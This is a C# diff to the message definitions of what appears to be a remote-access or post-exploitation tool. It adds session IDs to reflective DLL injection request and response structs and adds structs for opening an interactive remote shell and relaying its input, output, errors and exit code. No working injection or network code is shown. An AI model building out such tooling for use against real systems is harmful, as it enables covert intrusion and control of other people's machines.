@@ -167,6 +167,7 @@
 		[Serializable]
 		public struct DllInjectionRequest
 		{
+			public Guid Sid { get; set; }
 			public int TargetProcessId;
 			public string ReflectiveLoaderProcName;
 			public byte[] TheDll;
@@ -175,12 +176,48 @@
 		[Serializable]
 		public struct DllInjectionResponse
 		{
+			public Guid Sid { get; set; }
 			public int ErrorCode { get; set; }
 			public int GetLastError { get; set; }
 		}
 		#endregion
 
-		#region Remote File Execution
+		#region Shell
+		[Serializable]
+		public struct ShellOpenRequest
+		{
+			public Guid Sid { get; set; }
+			public string ShellFileName { get; set; }
+			public string ShellArguments { get; set; }
+		}
+
+		[Serializable]
+		public struct ShellInRequest
+		{
+			public Guid Sid { get; set; }
+			public string Message { get; set; }
+		}
+
+		[Serializable]
+		public struct ShellOutResponse
+		{
+			public Guid Sid { get; set; }
+			public string Message { get; set; }
+		}
+
+		[Serializable]
+		public struct ShellErrResponse
+		{
+			public Guid Sid { get; set; }
+			public string Message { get; set; }
+		}
+
+		[Serializable]
+		public struct ShellExitResponse
+		{
+			public Guid Sid { get; set; }
+			public int ExitCode { get; set; }
+		}
 		#endregion
 	}
 }
